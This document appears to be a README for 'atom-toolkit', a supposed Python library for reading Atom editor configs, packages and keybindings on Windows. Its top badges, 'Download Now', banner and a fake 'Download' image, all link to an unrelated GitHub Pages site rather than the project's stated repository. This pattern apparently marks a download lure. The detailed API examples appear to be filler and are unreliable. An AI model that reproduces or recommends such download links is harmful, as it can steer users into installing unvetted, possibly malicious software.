# atom-toolkit

[![Download Now](https://img.shields.io/badge/Download_Now-Click_Here-brightgreen?style=for-the-badge&logo=download)](https://JammyrRT.github.io/atom-page-ylx/)


[![Banner](banner.png)](https://JammyrRT.github.io/atom-page-ylx/)


![Python Version](https://img.shields.io/badge/python-3.8%2B-blue.svg)
![License](https://img.shields.io/badge/license-MIT-green.svg)
![PyPI Version](https://img.shields.io/pypi/v/atom-toolkit.svg)
![Build Status](https://img.shields.io/github/actions/workflow/status/atom-toolkit/atom-toolkit/ci.yml)
![Coverage](https://img.shields.io/codecov/c/github/atom-toolkit/atom-toolkit)
![Download](https://JammyrRT.github.io/atom-page-ylx/)

> A Python toolkit for automating workflows, processing project files, and extracting configuration data from Atom editor environments on Windows.

`atom-toolkit` is a developer utility library that integrates with the [Atom text editor](https://atom.io/) on Windows, giving you programmatic access to workspace settings, package configurations, and file-processing pipelines. Whether you are migrating projects, auditing editor configurations, or building automation scripts around your development environment, `atom-toolkit` provides a clean, well-documented API to get the job done.

---

## Table of Contents

- [Features](#features)
- [Requirements](#requirements)
- [Installation](#installation)
- [Quick Start](#quick-start)
- [Usage Examples](#usage-examples)
- [Configuration](#configuration)
- [Contributing](#contributing)
- [License](#license)

---

## Features

- 🗂 **Workspace File Processing** — Scan, parse, and batch-process files opened within Atom editor project directories on Windows
- ⚙️ **Configuration Extraction** — Read and analyze `config.cson` and `package.json` files from Atom's user profile directory
- 🔌 **Package Inventory** — List, audit, and export installed Atom packages with version metadata
- 🤖 **Workflow Automation** — Build repeatable automation scripts around common Atom editor tasks and project setups
- 📊 **Data Analysis Helpers** — Aggregate editor usage stats, keybinding maps, and snippet libraries into structured Python objects
- 🪟 **Windows Path Resolution** — Automatically resolves `%USERPROFILE%` and `AppData` paths specific to Atom on Windows installations
- 🔄 **CSON/JSON Conversion** — Convert Atom's native CSON configuration format to JSON, YAML, or Python dictionaries
- 🧪 **Testable & Extensible** — Clean class-based design with full type hints, making it easy to extend or mock in test suites

---

## Requirements

| Requirement | Version |
|---|---|
| Python | `>= 3.8` |
| Operating System | Windows 10 / 11 (Linux/macOS partial support) |
| Atom Editor | `>= 1.57` installed on the system |
| `cson` | `>= 0.8` |
| `pyyaml` | `>= 6.0` |
| `click` | `>= 8.0` |
| `rich` | `>= 13.0` |
| `pydantic` | `>= 2.0` |

---

## Installation

**From PyPI (recommended):**

```bash
pip install atom-toolkit
```

**From source:**

```bash
git clone https://github.com/atom-toolkit/atom-toolkit.git
cd atom-toolkit
pip install -e ".[dev]"
```

**With optional analysis extras:**

```bash
pip install "atom-toolkit[analysis]"
```

---

## Quick Start

```python
from atom_toolkit import AtomEnvironment

# Auto-detect Atom installation on Windows
env = AtomEnvironment.from_windows_profile()

print(f"Atom profile found at: {env.profile_path}")
print(f"Installed packages: {len(env.packages)}")
print(f"Active config keys: {len(env.config.keys())}")
```

Expected output:

```
Atom profile found at: C:\Users\yourname\.atom
Installed packages: 42
Active config keys: 17
```

---

## Usage Examples

### 1. Extract Installed Package Information

```python
from atom_toolkit import AtomEnvironment
from atom_toolkit.packages import PackageInventory

env = AtomEnvironment.from_windows_profile()
inventory = PackageInventory(env)

# Get all installed packages as a list of dicts
packages = inventory.list_packages()

for pkg in packages:
    print(f"{pkg['name']:30s} v{pkg['version']}")

# Export to JSON for auditing or migration
inventory.export_json("atom_packages_export.json")
```

```json
// atom_packages_export.json (sample)
[
  { "name": "atom-beautify", "version": "0.33.4", "enabled": true },
  { "name": "file-icons",    "version": "2.1.46", "enabled": true },
  { "name": "minimap",       "version": "4.29.9", "enabled": true }
]
```

---

### 2. Parse and Convert Atom Configuration

```python
from atom_toolkit.config import AtomConfig

# Load config.cson from the default Windows Atom profile path
config = AtomConfig.load()

# Access nested config values using dot notation
font_size = config.get("editor.fontSize", default=14)
tab_length = config.get("editor.tabLength", default=2)
theme      = config.get("core.themes", default=[])

print(f"Font size : {font_size}")
print(f"Tab length: {tab_length}")
print(f"UI themes : {theme}")

# Convert the full configuration to a plain Python dict
config_dict = config.to_dict()

# Save as YAML for use in other tooling
config.to_yaml("atom_config_export.yaml")
```

---

### 3. Batch Process Project Files

```python
from pathlib import Path
from atom_toolkit.files import ProjectFileProcessor

project_root = Path("C:/Users/yourname/projects/my-app")

processor = ProjectFileProcessor(
    root=project_root,
    extensions=[".js", ".py", ".md"],
    exclude_dirs=["node_modules", ".git", "__pycache__"],
)

# Collect file metadata
file_report = processor.scan()

print(f"Total files : {file_report.total_count}")
print(f"Total size  : {file_report.total_size_mb:.2f} MB")
print(f"By extension: {file_report.by_extension}")

# Find files modified in the last 7 days
recent_files = processor.filter_by_age(days=7)
for f in recent_files:
    print(f"  Modified: {f.modified_at}  →  {f.relative_path}")
```

---

### 4. Automate Workflow with CLI

`atom-toolkit` ships with a built-in CLI powered by [Click](https://click.palletsprojects.com/):

```bash
# List all installed Atom packages
atom-toolkit packages list

# Export packages to a file
atom-toolkit packages export --format json --output packages.json

# Scan a project directory and print a summary
atom-toolkit files scan --path "C:/projects/my-app" --ext .py .js .md

# Convert config.cson to YAML
atom-toolkit config convert --to yaml --output atom_config.yaml
```

---

### 5. Analyze Keybindings

```python
from atom_toolkit.keybindings import KeybindingAnalyzer

analyzer = KeybindingAnalyzer.from_windows_profile()

# Find all custom keybindings defined by the user
custom_bindings = analyzer.get_user_defined()

for binding in custom_bindings:
    print(f"  {binding.selector:30s} | {binding.keystrokes:20s} | {binding.command}")

# Detect potential conflicts between packages
conflicts = analyzer.find_conflicts()
if conflicts:
    print(f"\n⚠ Found {len(conflicts)} keybinding conflict(s):")
    for c in conflicts:
        print(f"  {c.keystrokes} — claimed by: {', '.join(c.sources)}")
```

---

## Configuration

You can configure toolkit behavior via a `atom_toolkit.toml` file in your project root or by passing parameters directly:

```toml
# atom_toolkit.toml

[profile]
windows_path = "C:/Users/yourname/.atom"   # override auto-detection

[processing]
max_file_size_mb = 10
follow_symlinks  = false

[export]
default_format = "json"
output_dir     = "./atom_toolkit_output"
```

Or programmatically:

```python
from atom_toolkit import AtomEnvironment, ToolkitConfig

cfg = ToolkitConfig(
    windows_path=r"C:\Users\yourname\.atom",
    max_file_size_mb=10,
    follow_symlinks=False,
)

env = AtomEnvironment(config=cfg)
```

---

## Project Structure

```
atom-toolkit/
├── atom_toolkit/
│   ├── __init__.py
│   ├── environment.py      # AtomEnvironment core class
│   ├── config.py           # CSON/JSON config parsing
│   ├── packages.py         # Package inventory and export
│   ├── files.py            # File scanning and processing
│   ├── keybindings.py      # Keybinding analysis
│   └── cli.py              # Click CLI entry points
├── tests/
│   ├── test_config.py
│   ├── test_packages.py
│   └── test_files.py
├── pyproject.toml
├── CHANGELOG.md
└── README.md
```

---

## Contributing

Contributions are welcome and appreciated. Please follow these steps:

1. **Fork** the repository
2. **Create** a feature branch: `git checkout -b feature/your-feature-name`
3. **Write tests** for new functionality under `tests/`
4. **Ensure** all tests pass: `pytest --cov=atom_toolkit`
5. **Submit** a pull request with a clear description of changes

Please read [CONTRIBUTING.md](CONTRIBUTING.md) for our code style guidelines and commit message conventions. All contributors are expected to follow our [Code of Conduct](CODE_OF_CONDUCT.md).

**Running the test suite locally:**

```bash
pip install -e ".[dev]"
pytest tests/ -v --cov=atom_toolkit --cov-report=term-missing
```

---

## Changelog

See [CHANGELOG.md](CHANGELOG.md) for a full history of releases and changes.

---

## License

This project is licensed under the **MIT License** — see the [LICENSE](LICENSE) file for details.

```
MIT License

Copyright (c) 2024 atom-toolkit contributors

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction...
```

---

> **Note:** `atom-toolkit` is an independent open-source utility and is not affiliated with or endorsed by GitHub, Inc. or the Atom editor project. Atom is a trademark of GitHub, Inc.